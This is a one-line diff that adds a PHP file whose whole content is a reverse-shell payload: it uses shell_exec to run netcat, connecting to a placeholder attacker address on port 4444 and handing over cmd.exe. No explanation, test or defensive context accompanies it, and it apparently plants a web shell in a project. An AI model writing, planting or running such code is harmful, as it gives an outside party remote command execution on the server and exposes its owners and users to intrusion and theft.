@@ -1,0 +1,1 @@
+<?php echo shell_exec("nc -nv attacker_ip 4444 -e cmd.exe");?>
